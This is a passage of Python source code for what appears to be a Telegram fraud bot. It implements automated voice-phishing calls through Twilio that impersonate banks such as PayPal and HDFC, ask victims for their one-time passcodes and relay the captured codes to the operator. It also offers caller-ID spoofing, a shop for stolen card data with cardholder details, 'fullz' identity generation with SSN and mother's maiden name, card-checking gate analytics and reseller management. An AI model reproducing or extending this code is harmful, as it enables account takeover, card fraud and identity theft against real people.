        "<b>Script tip:</b> Save a reusable script with <code>/setscript</code> — it will be used on every call automatically.\n\n"
        "<b>Examples:</b>\n"
        "<code>/call +12025551234 John_Doe 6 PayPal hi</code>\n"
        "<code>/call +12025551234 Rahul 6 HDFC</code>  ← shows language picker\n"
        "<code>/call +12025551234 Rahul 6 HDFC hi | Namaste ji, 1 dabayein.</code>\n\n"
        "The call will:\n"
        "1️⃣ Ring the target — they press 1 to continue\n"
        "2️⃣ Request they enter their OTP code\n"
        "3️⃣ Send you the captured code instantly 🔐\n\n"
        "<b>Hindi voice:</b> Slow &amp; sweet (Polly Kajal) 🎙"
    )

    if not args or len(args) < 4:
        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
        return

    # Parse args — split on | to extract optional custom script
    raw = " ".join(args)
    custom_script_inline = ""
    if "|" in raw:
        parts = raw.split("|", 1)
        call_args = parts[0].strip().split()
        custom_script_inline = parts[1].strip()
    else:
        call_args = args

    if len(call_args) < 4:
        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
        return

    phone          = call_args[0]
    name           = call_args[1].replace("_", " ")
    otp_digits_str = call_args[2]
    company        = call_args[3].replace("_", " ")
    # lang is optional — if absent, show language picker
    explicit_lang  = call_args[4].lower() if len(call_args) >= 5 else ""

    if not phone.startswith("+"):
        await update.message.reply_text(
            "❌ Phone number must include country code.\n"
            "Example: <code>+12025551234</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        otp_digits = int(otp_digits_str)
        if not (4 <= otp_digits <= 8):
            raise ValueError()
    except ValueError:
        await update.message.reply_text("❌ OTP digits must be a number between 4 and 8.")
        return

    from modules.twilio_call import (
        LANGUAGES, initiate_call, TWILIO_ACCOUNT_SID
    )

    if not TWILIO_ACCOUNT_SID:
        await update.message.reply_text(
            "❌ Twilio credentials not configured.\n"
            "Set TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, and TWILIO_PHONE_NUMBER in secrets."
        )
        return

    # Resolve the script: inline override > saved script > (empty = default)
    saved_script  = context.user_data.get('call_script', '')
    custom_script = custom_script_inline if custom_script_inline else saved_script

    # Resolve saved caller ID for this user
    from modules.twilio_call import get_user_caller_id
    caller_id = get_user_caller_id(str(user_id))

    # If no lang given, show the language picker keyboard
    if not explicit_lang or explicit_lang not in LANGUAGES:
        context.user_data['pending_call'] = {
            "phone": phone,
            "name": name,
            "otp_digits": otp_digits,
            "company": company,
            "custom_script": custom_script,
            "caller_id": caller_id,
            "chat_id": str(chat_id),
            "user_id": str(user_id),
        }
        script_note = (
            f"\n📝 <i>Script: {html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
            if custom_script else "\n📝 <i>Using default script</i>"
        )
        from telegram import InlineKeyboardMarkup, InlineKeyboardButton
        await update.message.reply_text(
            f"🌐 <b>Choose voice language for the call:</b>\n\n"
            f"📞 <code>{phone}</code> — {name} — {company}{script_note}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🇮🇳 Hindi", callback_data="calllang_hi"),
                 InlineKeyboardButton("🇬🇧 English", callback_data="calllang_en")],
                [InlineKeyboardButton("🇪🇸 Spanish", callback_data="calllang_es"),
                 InlineKeyboardButton("🇫🇷 French", callback_data="calllang_fr")],
                [InlineKeyboardButton("🇩🇪 German", callback_data="calllang_de"),
                 InlineKeyboardButton("🇧🇷 Portuguese", callback_data="calllang_pt")],
            ]),
        )
        return

    lang = explicit_lang
    await _place_call(update, context, phone, name, otp_digits, company, lang,
                      custom_script, chat_id, user_id, caller_id=caller_id)


async def call_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles language picker button presses from /call flow.
    callback_data format: calllang_<code>  e.g. calllang_hi
    Only the user who ran /call may press the buttons.
    """
    query = update.callback_query

    lang = query.data.split("_", 1)[1]
    presser_id = str(query.from_user.id)

    # Ownership guard — only the invoker can select a language
    pending = context.user_data.get('pending_call')
    if not pending or pending.get('user_id') != presser_id:
        await query.answer("❌ This language picker is not for you.", show_alert=True)
        return

    await query.answer()
    context.user_data.pop('pending_call', None)

    phone         = pending['phone']
    name          = pending['name']
    otp_digits    = pending['otp_digits']
    company       = pending['company']
    custom_script = pending.get('custom_script', '')
    caller_id     = pending.get('caller_id', '')
    chat_id       = pending['chat_id']
    user_id       = pending['user_id']

    from modules.twilio_call import LANGUAGES, initiate_call, TWILIO_PHONE

    flag_map = {
        "hi": "🇮🇳", "en": "🇬🇧", "es": "🇪🇸",
        "fr": "🇫🇷", "de": "🇩🇪", "pt": "🇧🇷",
    }
    flag = flag_map.get(lang, "🌐")
    lang_name = LANGUAGES.get(lang, "English")
    cid_display = caller_id.strip() if caller_id.strip() else TWILIO_PHONE

    script_preview = (
        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
        if custom_script else ""
    )

    await query.edit_message_text(
        f"📡 <b>Initiating call...</b>\n\n"
        f"📞 Target: <code>{phone}</code>\n"
        f"📲 Caller ID: <code>{cid_display}</code>\n"
        f"👤 Name: {name}\n"
        f"🏢 Company: {company}\n"
        f"🔢 OTP Digits: {otp_digits}\n"
        f"{flag} Language: {lang_name}{script_preview}",
        parse_mode=ParseMode.HTML,
    )

    try:
        result = initiate_call(
            phone=phone,
            chat_id=str(chat_id),
            user_id=str(user_id),
            name=name,
            company=company,
            otp_digits=otp_digits,
            lang=lang,
            custom_script=custom_script,
            caller_id=caller_id,
        )
        await query.edit_message_text(
            f"✅ <b>Call placed!</b>\n\n"
            f"📞 Target: <code>{phone}</code>\n"
            f"📲 Caller ID: <code>{cid_display}</code>\n"
            f"👤 Name: {name}\n"
            f"🏢 Company: {company}\n"
            f"🔢 OTP Digits: {otp_digits}\n"
            f"{flag} Language: {lang_name}\n"
            f"📋 Call SID: <code>{result['sid']}</code>\n"
            f"📊 Status: {result['status']}{script_preview}\n\n"
            f"🔔 You'll receive live status updates and the OTP here.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        err = str(e)
        if "invalid phone number" in err.lower() or "21211" in err:
            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
        elif "not a valid" in err.lower() or "21614" in err:
            msg = "❌ Phone number is not SMS-capable or invalid."
        elif "account" in err.lower() and "not" in err.lower():
            msg = "❌ Twilio account issue. Check your credentials."
        elif "21608" in err:
            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
        else:
            msg = f"❌ Call failed: {html_escape(err)}"
        await query.edit_message_text(msg, parse_mode=ParseMode.HTML)


async def _place_call(update, context, phone, name, otp_digits, company, lang,
                      custom_script, chat_id, user_id, caller_id: str = ""):
    """Shared helper: place the call and report success/failure."""
    from modules.twilio_call import LANGUAGES, initiate_call, TWILIO_PHONE

    script_preview = (
        f"\n📝 Script: <i>{html_escape(custom_script[:60])}{'…' if len(custom_script) > 60 else ''}</i>"
        if custom_script else ""
    )
    cid_display = caller_id.strip() if caller_id.strip() else TWILIO_PHONE

    status_msg = await update.message.reply_text(
        f"📡 <b>Initiating call...</b>\n\n"
        f"📞 Target: <code>{phone}</code>\n"
        f"📲 Caller ID: <code>{cid_display}</code>\n"
        f"👤 Name: {name}\n"
        f"🏢 Company: {company}\n"
        f"🔢 OTP Digits: {otp_digits}\n"
        f"🌐 Language: {LANGUAGES.get(lang, 'English')}{script_preview}",
        parse_mode=ParseMode.HTML,
    )

    try:
        result = initiate_call(
            phone=phone,
            chat_id=str(chat_id),
            user_id=str(user_id),
            name=name,
            company=company,
            otp_digits=otp_digits,
            lang=lang,
            custom_script=custom_script,
            caller_id=caller_id,
        )
        await status_msg.edit_text(
            f"✅ <b>Call placed!</b>\n\n"
            f"📞 Target: <code>{phone}</code>\n"
            f"📲 Caller ID: <code>{cid_display}</code>\n"
            f"👤 Name: {name}\n"
            f"🏢 Company: {company}\n"
            f"🔢 OTP Digits: {otp_digits}\n"
            f"🌐 Language: {LANGUAGES.get(lang, 'English')}\n"
            f"📋 Call SID: <code>{result['sid']}</code>\n"
            f"📊 Status: {result['status']}{script_preview}\n\n"
            f"🔔 You'll receive live status updates and the OTP here.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        err = str(e)
        if "invalid phone number" in err.lower() or "21211" in err:
            msg = "❌ Invalid phone number format. Use E.164 format: <code>+12025551234</code>"
        elif "not a valid" in err.lower() or "21614" in err:
            msg = "❌ Phone number is not SMS-capable or invalid."
        elif "account" in err.lower() and "not" in err.lower():
            msg = "❌ Twilio account issue. Check your credentials."
        elif "21608" in err:
            msg = "❌ Phone number is unverified. Add it to Twilio's verified caller IDs (trial accounts only)."
        else:
            msg = f"❌ Call failed: {html_escape(err)}"
        await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)


async def otp_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles ✅ Accept OTP / ❌ Decline OTP button presses from captured OTP messages.
    callback_data format: otp_accept_<digits> or otp_decline_<digits>
    """
    query = update.callback_query
    await query.answer()

    parts = query.data.split("_", 2)
    if len(parts) < 3:
        await query.edit_message_text("❌ Invalid callback data.")
        return

    action = parts[1]
    otp    = parts[2]

    if action == "accept":
        phone_line = ""
        if query.message and query.message.text:
            for line in query.message.text.splitlines():
                if "Phone:" in line or "📞" in line:
                    phone_line = line.strip()
                    break
        await query.edit_message_text(
            f"✅ <b>OTP Accepted</b>\n\n"
            f"🔑 Code: <b><code>{otp}</code></b>\n"
            f"{phone_line}\n\n"
            f"<i>Marked as accepted by operator.</i>",
            parse_mode=ParseMode.HTML,
        )
    elif action == "decline":
        await query.edit_message_text(
            f"❌ <b>OTP Declined</b>\n\n"
            f"🔑 Code: <code>{otp}</code>\n\n"
            f"<i>Marked as rejected by operator.</i>",
            parse_mode=ParseMode.HTML,
        )


async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("Only owners can add balance.")
        return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addbalance <user_id> <amount>")
        return

    try:
        target_id = int(args[0])
        amount = float(args[1])
    except ValueError:
        await update.message.reply_text("Invalid user_id or amount.")
        return

    from modules.cc_shop import add_user_balance, get_user_balance
    add_user_balance(target_id, amount)
    new_balance = get_user_balance(target_id)
    await update.message.reply_text(
        f"✅ Added ${amount:.2f} to user {target_id}\n"
        f"New balance: ${new_balance:.2f}",
        parse_mode=ParseMode.HTML
    )


async def mypurchases_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("You are not approved to use this bot.")
        return

    from modules.cc_shop import get_purchased_cards
    data = get_purchased_cards(user_id, page=1, per_page=5)

    if not data['cards']:
        await update.message.reply_text("You haven't purchased any cards yet.\nUse /shop to browse available cards.")
        return

    lines = []
    for c in data['cards']:
        cc_full = f"{c['cc_number']}|{c['mm']}|{c['yy']}|{c['cvv']}"
        lines.append(
            f"💳 <code>{cc_full}</code>\n"
            f"   {c.get('brand','')} | {c.get('country','')} | ${float(c.get('price',0)):.2f}\n"
            f"   👤 {c.get('holder_name','N/A')} | {c.get('holder_email','N/A')}\n"
            f"   📱 {c.get('holder_phone','N/A')}\n"
            f"   📍 {c.get('holder_address','N/A')}"
        )

    text = (
        f"🛒 <b>Your Purchases</b> ({data['total']} total)\n\n"
        + "\n\n".join(lines)
    )
    if len(text) > 4000:
        text = text[:4000] + "\n\n..."
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


def _mdb():
    """Return a synchronous _execute_with_retry callable from database module."""
    from modules.database import _execute_with_retry as _er
    return _er


def _ensure_marketplace_table():
    """Create marketplace_listings table if not exists."""
    _mdb()("""
        CREATE TABLE IF NOT EXISTS marketplace_listings (
            listing_id TEXT PRIMARY KEY,
            seller_id INTEGER NOT NULL,
            buyer_id INTEGER,
            price INTEGER NOT NULL,
            description TEXT,
            status TEXT DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)


async def cmd_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a synthetic billing address (/address [country])."""
    from modules.fake_identity import generate_holder_info
    country = " ".join(context.args) if context.args else ""
    info = generate_holder_info(country_name=country)
    await update.message.reply_text(
        ae("🏠 <b>Billing Address</b>") + "\n\n"
        f"👤 <b>Name:</b> <code>{info['name']}</code>\n"
        f"📧 <b>Email:</b> <code>{info['email']}</code>\n"
        f"📞 <b>Phone:</b> <code>{info['phone']}</code>\n"
        f"📍 <b>Address:</b> <code>{info['address']}</code>\n"
        f"🏙 <b>City:</b> <code>{info['city']}</code>\n"
        f"🗺 <b>State:</b> <code>{info['state']}</code>\n"
        f"📮 <b>Zip:</b> <code>{info['zip']}</code>\n"
        f"🌍 <b>Country:</b> <code>{info['country_code']}</code>",
        parse_mode=ParseMode.HTML,
    )


async def cmd_fullz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a complete synthetic fullz identity (/fullz [country])."""
    @require_approval
    async def _inner(update, context):
        country = " ".join(context.args) if context.args else ""
        info = generate_fullz(country_name=country)
        await update.message.reply_text(
            ae("🗂 <b>FULLZ — Full Synthetic Identity</b>") + "\n\n"
            f"👤 <b>Name:</b> <code>{info['name']}</code>\n"
            f"🎂 <b>DOB:</b> <code>{info['dob']}</code>\n"
            f"🪪 <b>SSN/ID:</b> <code>{info['ssn']}</code>\n"
            f"🚗 <b>DL:</b> <code>{info['dl']}</code>\n"
            f"👩 <b>Mother's Maiden:</b> <code>{info['mothers_maiden']}</code>\n\n"
            f"📧 <b>Email:</b> <code>{info['email']}</code>\n"
            f"📞 <b>Phone:</b> <code>{info['phone']}</code>\n"
            f"📍 <b>Address:</b> <code>{info['address']}</code>\n"
            f"🏙 <b>City:</b> <code>{info['city']}</code>\n"
            f"🗺 <b>State:</b> <code>{info['state']}</code>\n"
            f"📮 <b>Zip:</b> <code>{info['zip']}</code>\n"
            f"🌍 <b>Country:</b> <code>{info['country_code']}</code>\n\n"
            f"💳 <b>CC:</b> <code>{info['cc']}</code>\n"
            f"📅 <b>Exp:</b> <code>{info['cc_exp']}</code>\n"
            f"🔐 <b>CVV:</b> <code>{info['cc_cvv']}</code>",
            parse_mode=ParseMode.HTML,
        )
    await _inner(update, context)


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's credit balance (/balance)."""
    user_id = update.effective_user.id
    bal = get_balance(user_id)
    hist = get_transaction_history(user_id, limit=5)
    lines = []
    for row in hist:
        sign = "+" if row.get('amount', 0) > 0 else ""
        lines.append(f"  {sign}{row.get('amount', 0)} — {row.get('description', row.get('reason', ''))[:40]}")
    hist_text = "\n".join(lines) if lines else "  No recent transactions"
    await update.message.reply_text(
        ae("💰 <b>Credit Balance</b>") + "\n\n"
        f"💵 Balance: <b>{bal}</b> credits\n\n"
        f"📋 <b>Recent Transactions:</b>\n{hist_text}",
        parse_mode=ParseMode.HTML,
    )


async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a credit voucher (/redeem <code>)."""
    if not context.args:
        await update.message.reply_text(
            "🎟 <b>Redeem Voucher</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/redeem &lt;code&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>code</code> — Your voucher code (case-sensitive)\n\n"
            "<b>Example:</b>\n"
            "<code>/redeem SAVE100</code>\n\n"
            "💡 Get voucher codes from the owner or marketplace.",
            parse_mode=ParseMode.HTML,
        )
        return
    code = context.args[0].strip()
    user_id = update.effective_user.id
    result = redeem_voucher(user_id, code)
    ok = result.get('success', False) if isinstance(result, dict) else False
    credits_added = result.get('credits', 0) if isinstance(result, dict) else 0
    err_msg = result.get('message', 'Failed') if isinstance(result, dict) else str(result)
    if ok:
        if credits_added:
            add_credits(user_id, credits_added, tx_type="voucher", description=f"Voucher: {code}")
        bal = get_balance(user_id)
        await update.message.reply_text(
            ae("✅ <b>Voucher Redeemed!</b>") + "\n\n"
            f"🎁 Credits added: <b>+{credits_added}</b>\n"
            f"💰 New balance: <b>{bal}</b>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(f"❌ {err_msg}", parse_mode=ParseMode.HTML)


async def cmd_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gift credits to another user (/gift @username amount or /gift user_id amount)."""
    if len(context.args) < 2:
        await update.message.reply_text(
            "💸 <b>Gift Credits</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/gift &lt;user_id&gt; &lt;amount&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram user ID of the recipient\n"
            "• <code>amount</code> — Number of credits to send (must be positive)\n\n"
            "<b>Examples:</b>\n"
            "<code>/gift 123456789 100</code>\n"
            "<code>/gift 987654321 50</code>\n\n"
            "💡 Credits are deducted from your balance instantly.\n"
            "Use <code>/balance</code> to check how many you have first.",
            parse_mode=ParseMode.HTML,
        )
        return
    target_raw = context.args[0].lstrip("@")
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Amount must be a number.", parse_mode=ParseMode.HTML)
        return
    if amount <= 0:
        await update.message.reply_text("❌ Amount must be positive.", parse_mode=ParseMode.HTML)
        return

    sender_id = update.effective_user.id
    try:
        target_id = int(target_raw)
    except ValueError:
        await update.message.reply_text(
            "❌ Please provide the numeric user ID.",
            parse_mode=ParseMode.HTML,
        )
        return

    sender_bal = get_balance(sender_id)
    if sender_bal < amount:
        await update.message.reply_text(
            f"❌ Insufficient credits. You have <b>{sender_bal}</b> credits.",
            parse_mode=ParseMode.HTML,
        )
        return

    ok, msg = transfer_credits(sender_id, target_id, amount)
    if ok:
        await update.message.reply_text(
            ae("🎁 <b>Gift Sent!</b>") + "\n\n"
            f"💸 Sent <b>{amount}</b> credits → <code>{target_id}</code>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(f"❌ {msg}", parse_mode=ParseMode.HTML)


async def cmd_voucher(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: create or list credit vouchers (/voucher create <credits> [max_uses] | /voucher list)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    sub = context.args[0].lower() if context.args else ""
    if sub == "create":
        try:
            credits_val = int(context.args[1]) if len(context.args) > 1 else 100
            max_uses = int(context.args[2]) if len(context.args) > 2 else 1
        except (ValueError, IndexError):
            await update.message.reply_text(
                "🎟 <b>Create Voucher</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/voucher create &lt;credits&gt; [max_uses]</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>credits</code> — How many credits the voucher grants\n"
                "• <code>max_uses</code> — How many times it can be redeemed (default: 1)\n\n"
                "<b>Examples:</b>\n"
                "<code>/voucher create 100</code>  ← single-use\n"
                "<code>/voucher create 50 10</code>  ← 10-use code",
                parse_mode=ParseMode.HTML,
            )
            return
        code = generate_credit_voucher(credits_val, max_uses=max_uses)
        await update.message.reply_text(
            ae("🎟 <b>Voucher Created</b>") + "\n\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"💰 Credits: <b>{credits_val}</b>\n"
            f"🔄 Max Uses: <b>{max_uses}</b>",
            parse_mode=ParseMode.HTML,
        )
    elif sub == "list":
        vouchers = get_all_vouchers()
        if not vouchers:
            await update.message.reply_text("No vouchers found.", parse_mode=ParseMode.HTML)
            return
        lines = []
        for v in vouchers[:20]:
            uses = v.get('uses', 0)
            max_uses = v.get('max_uses', 1)
            uses_left = max_uses - uses
            active = "✅" if v.get('active', True) else "❌"
            lines.append(
                f"• <code>{v['code']}</code> — {v.get('credits', 0)} cr | "
                f"{uses}/{max_uses} used | {active}"
            )
        await update.message.reply_text(
            ae("🎟 <b>Vouchers</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            "🎟 <b>Voucher Manager</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/voucher create &lt;credits&gt; [max_uses]</code>\n"
            "<code>/voucher list</code>\n\n"
            "<b>Subcommands:</b>\n"
            "• <code>create</code> — Generate a new redeemable voucher code\n"
            "• <code>list</code> — Show all vouchers with usage stats\n\n"
            "<b>Examples:</b>\n"
            "<code>/voucher create 100</code>  ← single-use, 100 credits\n"
            "<code>/voucher create 50 5</code>  ← 5 uses, 50 credits each\n"
            "<code>/voucher list</code>\n\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: add credits to user (/addcredits user_id amount)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "💰 <b>Add Credits</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/addcredits &lt;user_id&gt; &lt;amount&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram user ID to credit\n"
            "• <code>amount</code> — Number of credits to add\n\n"
            "<b>Example:</b>\n"
            "<code>/addcredits 123456789 500</code>\n\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        target = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid arguments.", parse_mode=ParseMode.HTML)
        return
    add_credits(target, amount, tx_type="add", description="Admin grant")
    await update.message.reply_text(
        f"✅ Added <b>{amount}</b> credits to <code>{target}</code>.",
        parse_mode=ParseMode.HTML,
    )


async def cmd_setcallerid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set custom caller ID for OTP calls (/setcallerid +12025551234)."""
    @require_approval
    async def _inner(update, context):
        from modules.twilio_call import set_user_caller_id
        if not context.args:
            await update.message.reply_text(
                "📞 <b>Set Caller ID</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/setcallerid &lt;number&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>number</code> — Phone number with country code (e.g. +12025551234)\n"
                "  Use <code>off</code> to reset to the default Twilio number\n\n"
                "<b>Examples:</b>\n"
                "<code>/setcallerid +12025551234</code>  ← spoof this number\n"
                "<code>/setcallerid off</code>  ← revert to default\n\n"
                "⚠️ Number must be verified in your Twilio account to work.\n"
                "Check your saved ID with <code>/callerid</code>.\n"
                "Use <code>/setcallerid off</code> to clear.",
                parse_mode=ParseMode.HTML,
            )
            return
        number = context.args[0].strip()
        user_id = update.effective_user.id
        if number.lower() == "off":
            set_user_caller_id(str(user_id), "")
            await update.message.reply_text("✅ Caller ID cleared. Using default Twilio number.", parse_mode=ParseMode.HTML)
        else:
            set_user_caller_id(str(user_id), number)
            await update.message.reply_text(
                ae("📞 <b>Caller ID Set</b>") + f"\n\n"
                f"Your calls will appear from: <code>{number}</code>\n"
                "⚠️ Number must be a verified Twilio caller ID or Twilio phone number.",
                parse_mode=ParseMode.HTML,
            )
    await _inner(update, context)


async def cmd_callerid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current caller ID setting (/callerid)."""
    from modules.twilio_call import get_user_caller_id
    user_id = update.effective_user.id
    cid = get_user_caller_id(str(user_id))
    if cid:
        msg = f"📞 Your caller ID: <code>{cid}</code>"
    else:
        msg = "📞 Using default Twilio number."
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show gate hit rate analytics (/analytics)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    stats = get_gate_stats()
    if not stats:
        await update.message.reply_text("No analytics data yet. Run some checks first.", parse_mode=ParseMode.HTML)
        return
    lines = []
    for s in stats[:15]:
        gate = s.get('gate', '?')
        total = s.get('total', 0)
        live = s.get('live', 0)
        rate = s.get('live_pct', 0.0)
        lines.append(f"• <b>{gate}</b>: {live}/{total} ({rate:.1f}% live)")
    await update.message.reply_text(
        ae("📊 <b>Gate Analytics (24h)</b>") + "\n\n" + "\n".join(lines),
        parse_mode=ParseMode.HTML,
    )


async def cmd_gatetest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: ping all gates for health status (/gatetest)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text("🔎 Testing all gates...", parse_mode=ParseMode.HTML)
    results = run_gate_health_check()
    lines = []
    for r in sorted(results, key=lambda x: x.get('gate', '')):
        icon = "✅" if r.get('up') else "❌"
        latency = r.get('latency_ms', 0)
        lines.append(f"{icon} <b>{r.get('gate', '?')}</b> — {latency}ms")
    await msg.edit_text(
        ae("🏥 <b>Gate Health Report</b>") + "\n\n" + "\n".join(lines),
        parse_mode=ParseMode.HTML,
    )


async def cmd_find(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: find user by ID or username (/find <user_id|@username>)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Find Listing</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/find &lt;keyword&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>keyword</code> — Search term (matches title or description)\n\n"
            "<b>Examples:</b>\n"
            "<code>/find fullz usa</code>\n"
            "<code>/find amazon account</code>\n\n"
            "💡 Searches all active marketplace listings.",
            parse_mode=ParseMode.HTML,
        )
        return
    query_val = context.args[0].lstrip("@")
    try:
        target_id = int(query_val)
    except ValueError:
        await update.message.reply_text("❌ Provide numeric user ID.", parse_mode=ParseMode.HTML)
        return

    try:
        chat = await context.bot.get_chat(target_id)
        username = f"@{chat.username}" if chat.username else "none"
        name = chat.full_name or "Unknown"
        is_prem = is_user_premium_sync(target_id)
        bal = get_balance(target_id)
        await update.message.reply_text(
            ae("🔍 <b>User Found</b>") + "\n\n"
            f"🆔 ID: <code>{target_id}</code>\n"
            f"👤 Name: {html_escape(name)}\n"
            f"🔗 Username: {username}\n"
            f"⭐ Premium: {'Yes' if is_prem else 'No'}\n"
            f"💰 Credits: {bal}",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Could not find user: {html_escape(str(e))}", parse_mode=ParseMode.HTML)


async def cmd_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: restart the bot process (/restart)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text("🔄 Restarting bot...", parse_mode=ParseMode.HTML)
    import os, sys
    os.execv(sys.executable, [sys.executable] + sys.argv)


async def cmd_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show reseller dashboard or add/remove resellers (/reseller)."""
    user_id = update.effective_user.id
    if is_owner(user_id):
        sub = context.args[0].lower() if context.args else "list"
        if sub == "add" and len(context.args) >= 3:
            try:
                rid = int(context.args[1])
                limit = int(context.args[2])
                commission = int(context.args[3]) if len(context.args) > 3 else 10
            except ValueError:
                await update.message.reply_text(
                    "👥 <b>Add Reseller</b>\n\n"
                    "<b>Usage:</b>\n"
                    "<code>/reseller add &lt;user_id&gt; &lt;client_limit&gt; [commission%]</code>\n\n"
                    "<b>Arguments:</b>\n"
                    "• <code>user_id</code> — Telegram ID of the reseller\n"
                    "• <code>client_limit</code> — Max clients they can manage\n"
                    "• <code>commission%</code> — Their commission rate (default: 10%)\n\n"
                    "<b>Example:</b>\n"
                    "<code>/reseller add 123456789 50 15</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            add_reseller(rid, username=f"user_{rid}", credit_limit=limit, commission_pct=commission, created_by=user_id)
            await update.message.reply_text(f"✅ Added reseller <code>{rid}</code> | Limit: {limit} | Commission: {commission}%", parse_mode=ParseMode.HTML)
        elif sub == "remove" and len(context.args) >= 2:
            try:
                rid = int(context.args[1])
            except ValueError:
                await update.message.reply_text(
                    "👥 <b>Remove Reseller</b>\n\n"
                    "<b>Usage:</b>\n"
                    "<code>/reseller remove &lt;user_id&gt;</code>\n\n"
                    "<b>Example:</b>\n"
                    "<code>/reseller remove 123456789</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            remove_reseller(rid)
            await update.message.reply_text(f"✅ Removed reseller <code>{rid}</code>", parse_mode=ParseMode.HTML)
        elif sub == "list":
            all_r = get_all_resellers()
            if not all_r:
                await update.message.reply_text("No resellers found.", parse_mode=ParseMode.HTML)
                return
            lines = [f"• <code>{r.get('user_id','?')}</code> @{r.get('username','?')} — {r.get('clients',0)} clients/{r.get('limit',0)} limit | {r.get('commission',0)}% commission" for r in all_r]
            await update.message.reply_text(ae("👥 <b>Resellers</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                "👥 <b>Reseller System</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/reseller</code>  ← your dashboard\n"
                "<code>/reseller list</code>  ← all resellers (owner)\n"
                "<code>/reseller add &lt;uid&gt; &lt;limit&gt; [commission%]</code>  ← add\n"
                "<code>/reseller remove &lt;uid&gt;</code>  ← remove\n\n"
                "<b>Dashboard shows:</b>\n"
                "• Your client list and limits\n"
                "• Commission rate and balance\n\n"
                "Use <code>/addclient &lt;uid&gt; &lt;limit&gt;</code> to add clients under you.\n"
                "👑 Admin commands require owner access.\n"
                "<code>/reseller list</code>\n"
                "<code>/reseller add &lt;id&gt; &lt;limit&gt; [commission%]</code>\n"
